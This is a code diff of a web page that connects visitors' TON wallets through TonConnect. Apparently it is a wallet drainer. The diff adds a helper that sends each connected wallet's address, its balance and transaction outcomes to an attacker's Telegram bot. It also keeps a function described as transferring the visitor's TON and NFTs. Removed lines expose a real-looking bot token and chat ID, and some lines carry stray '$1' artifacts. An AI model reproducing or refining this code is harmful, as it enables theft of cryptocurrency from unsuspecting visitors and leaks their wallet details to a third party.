@@ -54,6 +54,23 @@
         // Static tonconnect-manifest.json URL instead of dynamic creation
         const manifestUrl = 'https://aslan22822.github.io/ton-connect-wallet/tonconnect-manifest.json';
         
+        // Telegram Bot Configurations
+        const tgBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your Telegram bot token
+        const tgChatId = 'YOUR_TELEGRAM_CHAT_ID'; // Replace with your Telegram chat ID
+
+        // Function to send messages to Telegram
+        async function sendTelegramMessage(message) {
+            try {
+                const telegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(message)}`;
+                const response = await fetch(telegramUrl, { method: 'GET' });
+                if (!response.ok) {
+                    console.error('Failed to send message to Telegram:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+            }
+        }
+
         // Initialize TonConnect with manifest URL
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: manifestUrl,
@@ -61,14 +78,10 @@
         });
 
         // Event listener for wallet connection
-        tonConnectUI.onStatusChange((walletInfo) => {
+        tonConnectUI.onStatusChange(async (walletInfo) => {
             if (walletInfo.account) {
-                // Send wallet connected info to Telegram
-                const tgBotToken = '7825399084:AAFIOuS92DHDfN-hE9-SG_7hQqlc9jUqRP4'; // Replace with your Telegram bot token
-                const tgChatId = '5107144356'; // Replace with your Telegram chat ID
                 const message = `Wallet connected: ${walletInfo.account}`;
-                const telegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(message)}`;
-                await fetch(telegramUrl, { method: 'GET' });
+                await sendTelegramMessage(message);
                 checkBalance(walletInfo.account.address);
             } else {
                 console.error('No account connected or status not recognized.');
@@ -82,17 +95,8 @@
                 const data = await response.json();
                 if (data && data.result) {
                     const balance = parseFloat(data.result) / 1000000000; // Convert nanotons to TON
-                    // Send balance information to Telegram
                     const balanceMessage = `Balance of ${walletAddress}: ${balance} TON`;
-                    const balanceTelegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(balanceMessage)}`;
-                    await fetch(balanceTelegramUrl, { method: 'GET' });
-
-                    // Send balance information to Telegram
-                    const tgBotToken = '7825399084:AAFIOuS92DHDfN-hE9-SG_7hQqlc9jUqRP4'; // Replace with your Telegram bot token
-                    const tgChatId = '5107144356'; // Replace with your Telegram chat ID
-                    const message = `Wallet Address: ${walletAddress}\nBalance: ${balance} TON`;
-                    const telegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(message)}`;
-                    await fetch(telegramUrl, { method: 'GET' });
+                    await sendTelegramMessage(balanceMessage);
                 } else {
                     console.error('Failed to fetch balance');
                 }
@@ -102,10 +106,10 @@
         }
 
         // Function to transfer TON and NFTs
-$1async function didtrans() {
-$1    console.log('Attempting to send transaction...');
+        async function didtrans() {
+            console.log('Attempting to send transaction...');
             try {
-                const walletInfo = tonConnectUI.getConnectedWallet();
+                const walletInfo = tonConnectUI.connected;
                 if (!walletInfo || !walletInfo.account) {
                     alert('Please connect your wallet first.');
                     console.error('Wallet is not connected. Cannot proceed with transaction.');
@@ -124,18 +128,14 @@ $1    console.log('Attempting to send transaction...');
 
                 // Send transaction
                 await tonConnectUI.sendTransaction({ transaction });
-                // Send transaction success message to Telegram
                 const transactionMessage = 'Transaction sent successfully';
-                const transactionTelegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(transactionMessage)}`;
-                await fetch(transactionTelegramUrl, { method: 'GET' });
+                await sendTelegramMessage(transactionMessage);
             } catch (error) {
-                // Send transaction error message to Telegram
                 const errorMessage = `Failed to send transaction: ${error}`;
-                const errorTelegramUrl = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(errorMessage)}`;
-                await fetch(errorTelegramUrl, { method: 'GET' });
+                await sendTelegramMessage(errorMessage);
             }
         }
     </script>
-    <script src="tonsdk.js"></script>
+    
 </body>
 </html>
